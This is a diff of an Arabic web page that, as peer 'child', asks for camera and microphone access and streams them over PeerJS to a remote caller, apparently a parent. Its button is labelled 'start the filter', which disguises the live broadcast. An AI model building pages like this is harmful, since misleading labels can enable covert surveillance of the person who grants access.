@@ -2,27 +2,18 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title> فلتر </title>
+<title>البث</title>
 </head>
 <body>
 
-<h2>: عرض </h2>
+<h2>البث </h2>
 
-<button id="startCam" style="
-  padding: 12px 20px;
-  font-size: 18px;
-  background-color: #28a745;
-  color: white;
-  border: none;
-  border-radius: 8px;
-  cursor: pointer;
-">
- تشغيل الفلتر
-</button>
+<button id="start"> تشغيل الفلتر</button>
 
 <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
 <script>
-let peer, stream, dataConn;
+let peer;
+let stream = null;
 
 peer = new Peer("child", {
   host: "peerjs.com",
@@ -30,39 +21,27 @@ peer = new Peer("child", {
   port: 443
 });
 
-// زر لتشغيل الكاميرا
-document.getElementById("startCam").onclick = () => {
-  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-    .then(s => {
-      stream = s;
-      alert("الكاميرا جاهزة الآن! يمكنك الاتصال بالأب.");
+document.getElementById("start").onclick = async () => {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: true,
+      audio: true
+    });
 
-      // الرد على مكالمات الأب
-      peer.on("call", call => call.answer(stream));
+    document.getElementById("start").style.display = "none";
 
-      // استقبال أوامر الأب
-      peer.on("connection", conn => {
-        dataConn = conn;
-        dataConn.on("data", msg => {
-          if(msg.cmd === "switchCamera") alert("أمر تبديل الكاميرا مستقبلاً!");
-          if(msg.cmd === "mic") {
-            stream.getAudioTracks().forEach(track => track.enabled = !!msg.value);
-            alert(msg.value ? "الميكروفون مفعل" : "الميكروفون مكتوم");
-          }
-        });
-      });
+    peer.on("call", call => {
+      call.answer(stream);
+    });
 
-      // إخفاء الزر بعد التشغيل
-      document.getElementById("startCam").style.display = "none";
-
-    })
-    .catch(() => alert("لم يتم السماح بالكاميرا"));
+  } catch {
+    alert("لم يتم السماح بالكاميرا");
+  }
 };
 
-// تنظيف الكاميرا عند الخروج
 window.onbeforeunload = () => {
-  if(stream) stream.getTracks().forEach(t => t.stop());
-  peer && peer.destroy();
+  if (stream) stream.getTracks().forEach(t => t.stop());
+  peer.destroy();
 };
 </script>
 
